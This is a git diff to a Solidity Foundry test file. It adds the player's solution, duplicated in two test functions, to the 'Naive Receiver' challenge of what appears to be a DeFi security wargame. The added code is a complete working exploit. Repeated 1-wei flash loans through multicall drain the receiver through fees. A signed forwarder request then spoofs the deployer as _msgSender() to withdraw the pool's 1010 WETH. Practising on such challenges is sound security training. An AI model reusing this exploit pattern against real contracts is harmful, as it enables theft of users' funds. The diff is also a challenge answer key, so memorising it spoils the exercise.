@@ -3,9 +3,11 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
-import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
+import {NaiveReceiverPool, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
+import "../../lib/forge-std/src/console2.sol";
+import "../../src/naive-receiver/Multicall.sol";
 
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -46,6 +48,7 @@ contract NaiveReceiverChallenge is Test {
 
         // Deploy flashloan receiver contract and fund it with some initial WETH
         receiver = new FlashLoanReceiver(address(pool));
+        // receiver = 10 WETH
         weth.deposit{value: WETH_IN_RECEIVER}();
         weth.transfer(address(receiver), WETH_IN_RECEIVER);
 
@@ -73,11 +76,129 @@ contract NaiveReceiverChallenge is Test {
         );
     }
 
+    function test_debug() public checkSolvedByPlayer {
+        uint256 balancePool = pool.maxFlashLoan(address(weth));
+        console2.log("Pool's balance = ", balancePool);
+
+        bytes[] memory calls = new bytes[](10);
+        for (uint256 i; i < calls.length; ++i) {
+            calls[i] = abi.encodeWithSelector(
+                NaiveReceiverPool.flashLoan.selector,
+                address(receiver),
+                address(weth),
+                1 wei,
+                bytes("")
+            );
+        }
+
+        pool.multicall(calls);
+
+        console2.log("receiver's balance = ", weth.balanceOf(address(receiver)));
+        console2.log("pool 's balance = ", weth.balanceOf(address(pool)));
+        console2.log("deployer's deposit in pool = ", pool.deposits(address(deployer)));
+
+        bytes[] memory withdrawCalls = new bytes[](1);
+        withdrawCalls[0] = abi.encodeWithSelector(
+            NaiveReceiverPool.withdraw.selector,
+            1010 ether,
+            recovery,
+            deployer  // for _msgSender()
+        );
+
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: 1_000_000,
+            nonce: forwarder.nonces(player),
+            data: abi.encodeWithSelector(
+                Multicall.multicall.selector,
+                withdrawCalls
+            ),
+            deadline: block.timestamp + 1 days
+        });
+
+        bytes32 request_hash = forwarder.getDataHash(request);
+
+        bytes32 digest = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                forwarder.domainSeparator(),
+                request_hash
+            )
+        );
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        forwarder.execute(request, signature);
+
+        console2.log("pool 's balance = ", weth.balanceOf(address(pool)));
+        console2.log("recovery's balance = ", weth.balanceOf(address(recovery)));
+    }
+
     /**
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        uint256 balancePool = pool.maxFlashLoan(address(weth));
+        console2.log("Pool's balance = ", balancePool);
+
+        bytes[] memory calls = new bytes[](10);
+        for (uint256 i; i < calls.length; ++i) {
+            calls[i] = abi.encodeWithSelector(
+                NaiveReceiverPool.flashLoan.selector,
+                address(receiver),
+                address(weth),
+                1 wei,
+                bytes("")
+            );
+        }
+
+        pool.multicall(calls);
+
+        console2.log("receiver's balance = ", weth.balanceOf(address(receiver)));
+        console2.log("pool 's balance = ", weth.balanceOf(address(pool)));
+        console2.log("deployer's deposit in pool = ", pool.deposits(address(deployer)));
+
+        bytes[] memory withdrawCalls = new bytes[](1);
+        withdrawCalls[0] = abi.encodeWithSelector(
+            NaiveReceiverPool.withdraw.selector,
+            1010 ether,
+            recovery,
+            deployer  // for _msgSender()
+        );
+
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: 1_000_000,
+            nonce: forwarder.nonces(player),
+            data: abi.encodeWithSelector(
+                Multicall.multicall.selector,
+                withdrawCalls
+            ),
+            deadline: block.timestamp + 1 days
+        });
+
+        bytes32 request_hash = forwarder.getDataHash(request);
+
+        bytes32 digest = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                forwarder.domainSeparator(),
+                request_hash
+            )
+        );
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        forwarder.execute(request, signature);
+
+        console2.log("pool 's balance = ", weth.balanceOf(address(pool)));
+        console2.log("recovery's balance = ", weth.balanceOf(address(recovery)));
     }
 
     /**
